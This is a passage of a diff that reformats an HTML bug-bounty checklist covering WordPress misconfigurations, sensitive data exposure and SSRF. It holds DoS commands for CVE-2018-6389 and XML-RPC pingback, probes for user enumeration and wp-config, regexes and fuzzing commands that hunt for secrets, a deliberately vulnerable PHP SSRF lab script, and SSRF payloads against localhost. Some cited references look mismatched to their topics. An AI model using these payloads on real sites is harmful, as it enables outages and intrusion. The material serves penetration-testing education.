-                    <img src="https://github.com/cyspad/my-share-image-repo/blob/04ab3d0d2e241ca48c44d9d650fec25686b7a9e9/Web-Cache-Deception%20Scanner.jpg?raw=true">
-                </p>
 
-                <p>Happy Hunting ;)</p>
+                    <p align="center">
+                        <img
+                            src="https://github.com/cyspad/my-share-image-repo/blob/04ab3d0d2e241ca48c44d9d650fec25686b7a9e9/Web-Cache-Deception%20Scanner.jpg?raw=true">
+                    </p>
+
+                    <p>Happy Hunting ;)</p>
+                </div>
             </div>
-        </div>
-        
-        <!-- WordPress Common Misconfiguration Category -->
-<div class="category">
-    <h3><input type="checkbox" id="wordpress-common-misconfiguration">13 > WordPress Common Misconfiguration</h3>
-    <div class="subcategory">
-        <h4>Here I will try my best to mention all common security misconfigurations for WordPress I saw before or officially referenced. I will be attaching all PoC and references as well.</h4>
 
-        <h4>Index</h4>
-        <ul>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wordpress-detection">WordPress Detection</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#geneal-scan-tool">General Scan Tool</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#admin-panel">Admin Panel</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#cve-2018-6389">CVE-2018-6389</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#xmlrpcphp">xmlrpc.php</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-cronjob">Denial of Service via Cronjob</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-load-scriptsphp-cve-2018-6389">Denial of Service via load-scripts.php (CVE-2018-6389)</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wp-user-enumeration">WP User Enumeration</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#sensitive-files-exposed">Sensitive files exposed</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403">Bypass 403</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#enumerating-plugins">Enumerating plugins</a></li>
-            <li><a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/edit/main/WordPress/README.md#find-origin-ip-in-wordpress">Find WordPress Origin IP</a></li>
-        </ul>
+            <!-- WordPress Common Misconfiguration Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="wordpress-common-misconfiguration">13 > WordPress Common Misconfiguration
+                </h3>
+                <div class="subcategory">
+                    <h4>Here I will try my best to mention all common security misconfigurations for WordPress I saw
+                        before or officially referenced. I will be attaching all PoC and references as well.</h4>
 
-        <h4>WordPress Detection</h4>
-        <p>Well, if you are reading this you already know about technology detection tools and methods. Still adding them below:</p>
-        <ul>
-            <li>Wappalyzer</li>
-            <li>WhatRuns</li>
-            <li>BuildWith</li>
-        </ul>
+                    <h4>Index</h4>
+                    <ul>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wordpress-detection">WordPress
+                                Detection</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#geneal-scan-tool">General
+                                Scan Tool</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#admin-panel">Admin
+                                Panel</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#cve-2018-6389">CVE-2018-6389</a>
+                        </li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#xmlrpcphp">xmlrpc.php</a>
+                        </li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-cronjob">Denial
+                                of Service via Cronjob</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-load-scriptsphp-cve-2018-6389">Denial
+                                of Service via load-scripts.php (CVE-2018-6389)</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wp-user-enumeration">WP
+                                User Enumeration</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#sensitive-files-exposed">Sensitive
+                                files exposed</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403">Bypass
+                                403</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#enumerating-plugins">Enumerating
+                                plugins</a></li>
+                        <li><a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/edit/main/WordPress/README.md#find-origin-ip-in-wordpress">Find
+                                WordPress Origin IP</a></li>
+                    </ul>
 
-        <h4>General Scan Tool</h4>
-        <ul>
-            <li><a href="https://github.com/wpscanteam/wpscan">WpScan</a></li>
-            <li><a href="https://github.com/blackcrw/wprecon">WPrecon</a></li>
-            <li><a href="https://github.com/oways/cms-checker">cms-checker</a></li>
-            <li><a href="https://wpsec.com">https://wpsec.com</a></li>
-            <li><a href="https://www.infosecmatter.com/cms-vulnerability-scanners-for-wordpress-joomla-drupal-moodle-typo3/">For more see this</a></li>
-        </ul>
+                    <h4>WordPress Detection</h4>
+                    <p>Well, if you are reading this you already know about technology detection tools and methods.
+                        Still adding them below:</p>
+                    <ul>
+                        <li>Wappalyzer</li>
+                        <li>WhatRuns</li>
+                        <li>BuildWith</li>
+                    </ul>
 
-        <h4>Admin Panel</h4>
-        <p>If you find an admin login panel, you must report it in pentest. On a typical WordPress install, all you need to do is add /login/ or /admin/ to the end of your site URL.</p>
-        <p>For example:</p>
-        <ul>
-            <li>www.example.com/admin/</li>
-            <li>www.example.com/login/</li>
-        </ul>
-        <p>If for some reason, your WordPress login URL is not working properly, then you can easily access the WordPress login page by going to this URL:</p>
-        <ul>
-            <li>www.example.com/wp-login.php</li>
-            <li>www.example.com/admin/</li>
-            <li>www.example.com/wp-admin/</li>
-        </ul>
-        <h5>Bypass</h5>
-        <ul>
-            <li>If you can't find the admin panel, just go to /wp-admin/install.php and you'll find out where the login page has moved!</li>
-            <li>If you got 403, try methods that will be explained in "<a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403">Bypass 403 pages</a>".</li>
-        </ul>
+                    <h4>General Scan Tool</h4>
+                    <ul>
+                        <li><a href="https://github.com/wpscanteam/wpscan">WpScan</a></li>
+                        <li><a href="https://github.com/blackcrw/wprecon">WPrecon</a></li>
+                        <li><a href="https://github.com/oways/cms-checker">cms-checker</a></li>
+                        <li><a href="https://wpsec.com">https://wpsec.com</a></li>
+                        <li><a
+                                href="https://www.infosecmatter.com/cms-vulnerability-scanners-for-wordpress-joomla-drupal-moodle-typo3/">For
+                                more see this</a></li>
+                    </ul>
 
-        <h4>CVE-2018-6389</h4>
-        <p>This issue can bring down any WordPress site under 4.9.3. So, while reporting, make sure that your target website is running WordPress under 4.9.3.</p>
-        <h5>Detection</h5>
-        <p>Use the URL from my gist called loadsxploit; you will get massive JS data in response.</p>
-        <ul>
-            <li><a href="https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9">loadsxploit</a></li>
-        </ul>
-        <h5>Exploit</h5>
-        <p>You can use any DoS tool. I found Doser to be really fast, and it shuts down the webserver within 30 seconds.</p>
-        <ul>
-            <li><a href="https://github.com/quitten/doser.py">Doser</a></li>
-        </ul>
-        <pre>
+                    <h4>Admin Panel</h4>
+                    <p>If you find an admin login panel, you must report it in pentest. On a typical WordPress install,
+                        all you need to do is add /login/ or /admin/ to the end of your site URL.</p>
+                    <p>For example:</p>
+                    <ul>
+                        <li>www.example.com/admin/</li>
+                        <li>www.example.com/login/</li>
+                    </ul>
+                    <p>If for some reason, your WordPress login URL is not working properly, then you can easily access
+                        the WordPress login page by going to this URL:</p>
+                    <ul>
+                        <li>www.example.com/wp-login.php</li>
+                        <li>www.example.com/admin/</li>
+                        <li>www.example.com/wp-admin/</li>
+                    </ul>
+                    <h5>Bypass</h5>
+                    <ul>
+                        <li>If you can't find the admin panel, just go to /wp-admin/install.php and you'll find out
+                            where the login page has moved!</li>
+                        <li>If you got 403, try methods that will be explained in "<a
+                                href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403">Bypass
+                                403 pages</a>".</li>
+                    </ul>
+
+                    <h4>CVE-2018-6389</h4>
+                    <p>This issue can bring down any WordPress site under 4.9.3. So, while reporting, make sure that
+                        your target website is running WordPress under 4.9.3.</p>
+                    <h5>Detection</h5>
+                    <p>Use the URL from my gist called loadsxploit; you will get massive JS data in response.</p>
+                    <ul>
+                        <li><a href="https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9">loadsxploit</a>
+                        </li>
+                    </ul>
+                    <h5>Exploit</h5>
+                    <p>You can use any DoS tool. I found Doser to be really fast, and it shuts down the webserver within
+                        30 seconds.</p>
+                    <ul>
+                        <li><a href="https://github.com/quitten/doser.py">Doser</a></li>
+                    </ul>
+                    <pre>
             python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
         </pre>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://hackerone.com/reports/752010">H1 Report</a></li>
-            <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389">CVE Details</a></li>
-            <li><a href="https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html">Blog Post</a></li>
-        </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://hackerone.com/reports/752010">H1 Report</a></li>
+                        <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389">CVE Details</a></li>
+                        <li><a
+                                href="https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html">Blog
+                                Post</a></li>
+                    </ul>
 
-        <h4>xmlrpc.php</h4>
-        <p>This is one of the common issues with WordPress. To get some bucks with this misconfiguration, you must fully exploit it and show the impact properly.</p>
-        <p>XML-RPC is a remote procedure call (RPC) protocol which uses XML to encode its calls and HTTP as a transport mechanism. “XML-RPC” also refers generically to the use of XML for remote procedure calls, independently of the specific protocol. Basically, it's a file that can be used for pulling POST data from a website through Remote Procedure Call.</p>
-        <p>In WordPress, it’s an API that allows developers to perform operations on the WordPress site, such as publishing a post, editing a post, deleting a post, and even uploading some files.</p>
-        <h5>Detection</h5>
-        <ul>
-            <li>Visit site.com/xmlrpc.php</li>
-            <li>Get the error message about POST requests only</li>
-        </ul>
-        <h5>Exploit</h5>
-        <ul>
-            <li>Intercept the request and change the method GET to POST</li>
-            <li>List all Methods
-                <pre>
+                    <h4>xmlrpc.php</h4>
+                    <p>This is one of the common issues with WordPress. To get some bucks with this misconfiguration,
+                        you must fully exploit it and show the impact properly.</p>
+                    <p>XML-RPC is a remote procedure call (RPC) protocol which uses XML to encode its calls and HTTP as
+                        a transport mechanism. “XML-RPC” also refers generically to the use of XML for remote procedure
+                        calls, independently of the specific protocol. Basically, it's a file that can be used for
+                        pulling POST data from a website through Remote Procedure Call.</p>
+                    <p>In WordPress, it’s an API that allows developers to perform operations on the WordPress site,
+                        such as publishing a post, editing a post, deleting a post, and even uploading some files.</p>
+                    <h5>Detection</h5>
+                    <ul>
+                        <li>Visit site.com/xmlrpc.php</li>
+                        <li>Get the error message about POST requests only</li>
+                    </ul>
+                    <h5>Exploit</h5>
+                    <ul>
+                        <li>Intercept the request and change the method GET to POST</li>
+                        <li>List all Methods
+                            <pre>
                 &lt;methodCall&gt;
                 &lt;methodName&gt;system.listMethods&lt;/methodName&gt;
                 &lt;params&gt;&lt;/params&gt;
                 &lt;/methodCall&gt;
                 </pre>
-            </li>
-            <li>Check if the `pingback.ping` method is there or not</li>
-            <li>Perform DDOS
-                <pre>
+                        </li>
+                        <li>Check if the `pingback.ping` method is there or not</li>
+                        <li>Perform DDOS
+                            <pre>
                 &lt;methodCall&gt;
                 &lt;methodName&gt;pingback.ping&lt;/methodName&gt;
                 &lt;params&gt;
@@ -1528,180 +1947,204 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle
                 &lt;/params&gt;
                 &lt;/methodCall&gt;
                 </pre>
-            </li>
-        </ul>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External Entity Processing</a></li>
-            <li><a href="https://thehackernews.com/2019/12/xmlrpc-dos-wordpress.html">XML-RPC DoS Attack</a></li>
-        </ul>
+                        </li>
+                    </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External
+                                Entity Processing</a></li>
+                        <li><a href="https://thehackernews.com/2019/12/xmlrpc-dos-wordpress.html">XML-RPC DoS Attack</a>
+                        </li>
+                    </ul>
 
-        <h4>Denial of Service via Cronjob</h4>
-        <p>WordPress has an inbuilt cron job mechanism called WP-Cron, which runs automatically at scheduled intervals. This mechanism can be exploited to cause Denial of Service (DoS).</p>
-        <h5>Exploit</h5>
-        <p>Look for patterns that allow you to post requests continuously. One way to exploit is to spam the cron jobs in your target website.</p>
-        <pre>
+                    <h4>Denial of Service via Cronjob</h4>
+                    <p>WordPress has an inbuilt cron job mechanism called WP-Cron, which runs automatically at scheduled
+                        intervals. This mechanism can be exploited to cause Denial of Service (DoS).</p>
+                    <h5>Exploit</h5>
+                    <p>Look for patterns that allow you to post requests continuously. One way to exploit is to spam the
+                        cron jobs in your target website.</p>
+                    <pre>
         curl -X POST -d 'testdata' http://site.com/wp-cron.php
         </pre>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.acs.com.hk/en/products/275/acr1281u-c1/">DoS via WP-Cron</a></li>
-        </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.acs.com.hk/en/products/275/acr1281u-c1/">DoS via WP-Cron</a></li>
+                    </ul>
 
-        <h4>Denial of Service via load-scripts.php (CVE-2018-6389)</h4>
-        <p>This CVE is a critical issue found in WordPress. You should use the technique mentioned in CVE-2018-6389 to cause a DoS.</p>
-        <h5>Exploit</h5>
-        <pre>
+                    <h4>Denial of Service via load-scripts.php (CVE-2018-6389)</h4>
+                    <p>This CVE is a critical issue found in WordPress. You should use the technique mentioned in
+                        CVE-2018-6389 to cause a DoS.</p>
+                    <h5>Exploit</h5>
+                    <pre>
         curl -X GET "http://site.com/wp-includes/js/dist/vendor/react.js"
         </pre>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.exploit-db.com/exploits/45473">Exploit DB</a></li>
-            <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389">CVE Details</a></li>
-        </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.exploit-db.com/exploits/45473">Exploit DB</a></li>
+                        <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389">CVE Details</a></li>
+                    </ul>
 
-        <h4>WP User Enumeration</h4>
-        <p>WordPress provides various ways to enumerate users:</p>
-        <ul>
-            <li>http://example.com/?author=1 (change 1 to 2, 3, etc.)</li>
-            <li>http://example.com/wp-json/wp/v2/users (if REST API is enabled)</li>
-        </ul>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.owasp.org/index.php/User_Enumeration">OWASP User Enumeration</a></li>
-            <li><a href="https://securitytrails.com/blog/wp-user-enumeration">Security Trails</a></li>
-        </ul>
+                    <h4>WP User Enumeration</h4>
+                    <p>WordPress provides various ways to enumerate users:</p>
+                    <ul>
+                        <li>http://example.com/?author=1 (change 1 to 2, 3, etc.)</li>
+                        <li>http://example.com/wp-json/wp/v2/users (if REST API is enabled)</li>
+                    </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.owasp.org/index.php/User_Enumeration">OWASP User Enumeration</a></li>
+                        <li><a href="https://securitytrails.com/blog/wp-user-enumeration">Security Trails</a></li>
+                    </ul>
 
-        <h4>Sensitive Files Exposed</h4>
-        <p>Ensure sensitive files are not exposed:</p>
-        <ul>
-            <li>http://example.com/wp-config.php</li>
-            <li>http://example.com/.htaccess</li>
-        </ul>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.cvedetails.com/cve/CVE-2021-24287/">Sensitive File Exposure</a></li>
-        </ul>
+                    <h4>Sensitive Files Exposed</h4>
+                    <p>Ensure sensitive files are not exposed:</p>
+                    <ul>
+                        <li>http://example.com/wp-config.php</li>
+                        <li>http://example.com/.htaccess</li>
+                    </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.cvedetails.com/cve/CVE-2021-24287/">Sensitive File Exposure</a></li>
+                    </ul>
 
-        <h4>Bypass 403</h4>
-        <p>If you are encountering 403 Forbidden errors, try different methods such as:</p>
-        <ul>
-            <li>Check if URL is correct</li>
-            <li>Use different HTTP methods</li>
-            <li>Check for IP whitelisting issues</li>
-        </ul>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.owasp.org/index.php/403_Forbidden">OWASP 403 Forbidden</a></li>
-        </ul>
+                    <h4>Bypass 403</h4>
+                    <p>If you are encountering 403 Forbidden errors, try different methods such as:</p>
+                    <ul>
+                        <li>Check if URL is correct</li>
+                        <li>Use different HTTP methods</li>
+                        <li>Check for IP whitelisting issues</li>
+                    </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.owasp.org/index.php/403_Forbidden">OWASP 403 Forbidden</a></li>
+                    </ul>
 
-        <h4>Enumerating Plugins</h4>
-        <p>Use tools to enumerate WordPress plugins:</p>
-        <ul>
-            <li><a href="https://wpscan.com/">WPScan</a></li>
-            <li><a href="https://github.com/wpscanteam/wpscan">WPScan GitHub</a></li>
-        </ul>
-        <h5>References</h5>
-        <ul>
-            <li><a href="https://www.hacker101.com/tools/wp-enum">WP Enum Tool</a></li>
-        </ul>
+                    <h4>Enumerating Plugins</h4>
+                    <p>Use tools to enumerate WordPress plugins:</p>
+                    <ul>
+                        <li><a href="https://wpscan.com/">WPScan</a></li>
+                        <li><a href="https://github.com/wpscanteam/wpscan">WPScan GitHub</a></li>
+                    </ul>
+                    <h5>References</h5>
+                    <ul>
+                        <li><a href="https://www.hacker101.com/tools/wp-enum">WP Enum Tool</a></li>
+                    </ul>
 
-        <h4>Find WordPress Origin IP</h4>
-        <p>In some cases, you might want to find the origin IP of the WordPress server:</p>
-        <ul>
-            <li>Look for clues in headers</li>
-            <li>Use network reconnaissance tools</li>
-        </ul>
-        <h4>References</h4>
-        
-        Twitters:</br>
-@jae_hak99
-@minometidji
-@sw33tLie
-@Jester0x01
-@daffainfo
-@SalimAlk15
-@xalerafera
-@gopalsamy_ru
-@16yashpatel
-@fuxsocy_py
-@EkinBayer4
-@3XS0
-@CyberWarship
-@vxer0dayz</br>
+                    <h4>Find WordPress Origin IP</h4>
+                    <p>In some cases, you might want to find the origin IP of the WordPress server:</p>
+                    <ul>
+                        <li>Look for clues in headers</li>
+                        <li>Use network reconnaissance tools</li>
+                    </ul>
+                    <h4>References</h4>
+
+                    Twitters:</br>
+                    @jae_hak99
+                    @minometidji
+                    @sw33tLie
+                    @Jester0x01
+                    @daffainfo
+                    @SalimAlk15
+                    @xalerafera
+                    @gopalsamy_ru
+                    @16yashpatel
+                    @fuxsocy_py
+                    @EkinBayer4
+                    @3XS0
+                    @CyberWarship
+                    @vxer0dayz</br>
 
 
 
-        <ul>
-        	<li><a href="https://github.com/daffainfo/AllAboutBugBounty">AllAboutBugBounty</a></li>
-       		 <li><a href="https://github.com/KathanP19/HowToHunt">HowToHunt</a></li>
-       		 <li><a href="https://malavsharma.medium.com/wordpress-xmlrpc-php-my-first-resolved-report-bee438f35ad8">XMLRPC</a></li>
-        	    <li><a href="https://www.owasp.org/index.php/HTTP_Headers">OWASP HTTP Headers</a></li>
-        </ul>
-    </div>
-</div>
+                    <ul>
+                        <li><a href="https://github.com/daffainfo/AllAboutBugBounty">AllAboutBugBounty</a></li>
+                        <li><a href="https://github.com/KathanP19/HowToHunt">HowToHunt</a></li>
+                        <li><a
+                                href="https://malavsharma.medium.com/wordpress-xmlrpc-php-my-first-resolved-report-bee438f35ad8">XMLRPC</a>
+                        </li>
+                        <li><a href="https://www.owasp.org/index.php/HTTP_Headers">OWASP HTTP Headers</a></li>
+                    </ul>
+                </div>
+            </div>
 
-<!-- Sensitive Data Exposure Category -->
-<div class="category">
-    <h3><input type="checkbox" id="sensitive-data-exposure">14 > Sensitive Data Exposure</h3>
-    <div class="subcategory">
-        <h4>What is Sensitive Data Exposure</h4>
-        <p>Information disclosure, also known as information leakage, is when a website unintentionally reveals sensitive information to its users. Depending on the context, websites may leak all kinds of information to a potential attacker, including:</p>
-        <ul>
-            <li>Backup and Config Files Data</li>
-            <li>API Tokens</li>
-            <li>Technical details about the website and its infrastructure</li>
-        </ul>
-        <p>The dangers of leaking sensitive user or business data are fairly obvious, but disclosing technical information can sometimes be just as serious. Although some of this information will be of limited use, it can potentially be a starting point for exposing an additional attack surface, which may contain other interesting vulnerabilities. The knowledge that you are able to gather could even provide the missing piece of the puzzle when trying to construct complex, high-severity attacks.</p>
-        <p>Occasionally, sensitive information might be carelessly leaked to users who are simply browsing the website in a normal fashion. More commonly, however, an attacker needs to elicit the information disclosure by interacting with the website in unexpected or malicious ways. They will then carefully study the website's responses to try and identify interesting behavior.</p>
+            <!-- Sensitive Data Exposure Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="sensitive-data-exposure">14 > Sensitive Data Exposure</h3>
+                <div class="subcategory">
+                    <h4>What is Sensitive Data Exposure</h4>
+                    <p>Information disclosure, also known as information leakage, is when a website unintentionally
+                        reveals sensitive information to its users. Depending on the context, websites may leak all
+                        kinds of information to a potential attacker, including:</p>
+                    <ul>
+                        <li>Backup and Config Files Data</li>
+                        <li>API Tokens</li>
+                        <li>Technical details about the website and its infrastructure</li>
+                    </ul>
+                    <p>The dangers of leaking sensitive user or business data are fairly obvious, but disclosing
+                        technical information can sometimes be just as serious. Although some of this information will
+                        be of limited use, it can potentially be a starting point for exposing an additional attack
+                        surface, which may contain other interesting vulnerabilities. The knowledge that you are able to
+                        gather could even provide the missing piece of the puzzle when trying to construct complex,
+                        high-severity attacks.</p>
+                    <p>Occasionally, sensitive information might be carelessly leaked to users who are simply browsing
+                        the website in a normal fashion. More commonly, however, an attacker needs to elicit the
+                        information disclosure by interacting with the website in unexpected or malicious ways. They
+                        will then carefully study the website's responses to try and identify interesting behavior.</p>
 
-        <h4>API Key Disclosure - Hunting</h4>
-        <p>Hunting with Burp Suite</p>
-        <ul>
-            <li>Install <a href="https://github.com/PortSwigger/logger-plus-plus">Logger++</a> Extension</li>
-            <li>Paste the following regex in Filter Field:
-                <pre>Response.Body == /(?i)([a-z0-9]+){0,}((_|-){0,}(\\s){0,})(APIkey|secret|accesstoken|apiToken|localhost)(\\s){0,}(=|:|is|>){1,}/ AND Response.Headers CONTAINS "application/javascript"</pre>
-            </li>
-        </ul>
+                    <h4>API Key Disclosure - Hunting</h4>
+                    <p>Hunting with Burp Suite</p>
+                    <ul>
+                        <li>Install <a href="https://github.com/PortSwigger/logger-plus-plus">Logger++</a> Extension
+                        </li>
+                        <li>Paste the following regex in Filter Field:
+                            <pre>Response.Body == /(?i)([a-z0-9]+){0,}((_|-){0,}(\\s){0,})(APIkey|secret|accesstoken|apiToken|localhost)(\\s){0,}(=|:|is|>){1,}/ AND Response.Headers CONTAINS "application/javascript"</pre>
+                        </li>
+                    </ul>
 
-        <h4>Backup Files - Fuzzing</h4>
-        <ul>
-            <li><a href="https://github.com/ffuf/ffuf">FFUF</a> and cyspadSniper Wordlist
-                <pre>ffuf -u https://target.com/FUZZ -w cyspadSniper.txt -mc 200</pre>
-            </li>
-            <li><a href="https://github.com/musana/fuzzuli">FUZZULI</a>
-                <pre>echo https://target.com|fuzzuli -mt all -w 32 -ex .rar,.zip,.tar,.gzip,.backup,.bak -p</pre>
-            </li>
-        </ul>
+                    <h4>Backup Files - Fuzzing</h4>
+                    <ul>
+                        <li><a href="https://github.com/ffuf/ffuf">FFUF</a> and cyspadSniper Wordlist
+                            <pre>ffuf -u https://target.com/FUZZ -w cyspadSniper.txt -mc 200</pre>
+                        </li>
+                        <li><a href="https://github.com/musana/fuzzuli">FUZZULI</a>
+                            <pre>echo https://target.com|fuzzuli -mt all -w 32 -ex .rar,.zip,.tar,.gzip,.backup,.bak -p</pre>
+                        </li>
+                    </ul>
 
-        <h4>References:</h4>
-        <ul>
-        	<li>check cyspadSniper Wordlist</li>
-            <li><a href="https://portswigger.net/web-security/information-disclosure">PortSwigger Information Disclosure</a></li>
-        </ul>
-    </div>
-</div>
+                    <h4>References:</h4>
+                    <ul>
+                        <li>check cyspadSniper Wordlist</li>
+                        <li><a href="https://portswigger.net/web-security/information-disclosure">PortSwigger
+                                Information Disclosure</a></li>
+                    </ul>
+                </div>
+            </div>
 
-<!-- SSRF Category -->
-<div class="category">
-    <h3><input type="checkbox" id="ssrf">15 > Server Side Request Forgery (SSRF)</h3>
-    <div class="subcategory">
-        <h4>Overview</h4>
-        <p>Server Side Request Forgery (SSRF) is an attack where the server makes a request (acts like a proxy) to a local or remote source and returns a response containing the data from the request. This is similar to using a proxy or VPN, where the user makes a request to a resource, and the proxy or VPN server fetches and returns the results to the user.</p>
-        <p>With SSRF, various actions can be performed, such as:</p>
-        <ul>
-            <li>Local/Remote Port Scan</li>
-            <li>Reading a Local File (using file://)</li>
-            <li>Sensitive Data Disclosure (e.g., Server IP behind WAF)</li>
-            <li>Interacting with internal apps/services/network (e.g., http://localhost/admin or http://192.168.1.100/admin)</li>
-            <li>RCE by chaining services on the internal network</li>
-            <li>Reading Metadata from Cloud Providers (e.g., AWS, Azure, Google Cloud, Digital Ocean)</li>
-            <li>Reflected XSS/CSRF</li>
-        </ul>
+            <!-- SSRF Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="ssrf">15 > Server Side Request Forgery (SSRF)</h3>
+                <div class="subcategory">
+                    <h4>Overview</h4>
+                    <p>Server Side Request Forgery (SSRF) is an attack where the server makes a request (acts like a
+                        proxy) to a local or remote source and returns a response containing the data from the request.
+                        This is similar to using a proxy or VPN, where the user makes a request to a resource, and the
+                        proxy or VPN server fetches and returns the results to the user.</p>
+                    <p>With SSRF, various actions can be performed, such as:</p>
+                    <ul>
+                        <li>Local/Remote Port Scan</li>
+                        <li>Reading a Local File (using file://)</li>
+                        <li>Sensitive Data Disclosure (e.g., Server IP behind WAF)</li>
+                        <li>Interacting with internal apps/services/network (e.g., http://localhost/admin or
+                            http://192.168.1.100/admin)</li>
+                        <li>RCE by chaining services on the internal network</li>
+                        <li>Reading Metadata from Cloud Providers (e.g., AWS, Azure, Google Cloud, Digital Ocean)</li>
+                        <li>Reflected XSS/CSRF</li>
+                    </ul>
 
-        <h4>Lab Setup</h4>
-        <p>For the lab in this post, use the simple script below, which will be deployed on Digital Ocean:</p>
-        <pre><code>&lt;?php
+                    <h4>Lab Setup</h4>
+                    <p>For the lab in this post, use the simple script below, which will be deployed on Digital Ocean:
+                    </p>
+                    <pre><code>&lt;?php
     $url = $_GET['url'];
     $curl = curl_init();
     curl_setopt($curl, CURLOPT_URL, $url);
@@ -1716,70 +2159,90 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle
     }
     curl_close($curl);
 ?&gt;</code></pre>
-        <p>cURL was chosen for this blog post because it supports various protocols, making it suitable for learning purposes. A requestster is a function or library used to fetch or request a resource from an input URL.</p>
+                    <p>cURL was chosen for this blog post because it supports various protocols, making it suitable for
+                        learning purposes. A requestster is a function or library used to fetch or request a resource
+                        from an input URL.</p>
 
-        <h4>Local/Remote Port Scanning</h4>
-        <p>Port scanning maps running applications/services behind a port to identify what is running. This helps if an attacker wants to interact with internal applications/services.</p>
-        <p>Payload examples:</p>
-        <pre><code>vulnerablesite.com/file/?url=http://127.0.0.1:22
+                    <h4>Local/Remote Port Scanning</h4>
+                    <p>Port scanning maps running applications/services behind a port to identify what is running. This
+                        helps if an attacker wants to interact with internal applications/services.</p>
+                    <p>Payload examples:</p>
+                    <pre><code>vulnerablesite.com/file/?url=http://127.0.0.1:22
 vulnerablesite.com/file/?url=http://127.0.0.1:port
 vulnerablesite.com/file/?url=http://localhost:port
 vulnerablesite.com/file/?url=https://127.0.0.1:port
 vulnerablesite.com/file/?url=https://localhost:port
 vulnerablesite.com/file/?url=http://[::]:port
 vulnerablesite.com/file/?url=http://0000::1:port</code></pre>
-        <p>Indicators of open or closed ports can include content length, response time, or HTTP status codes.</p>
+                    <p>Indicators of open or closed ports can include content length, response time, or HTTP status
+                        codes.</p>
 
-        <h4>Local File Read</h4>
-        <p>To access local files using SSRF, the `file:///` protocol is used. If the requestster supports it, access can be made to local files.</p>
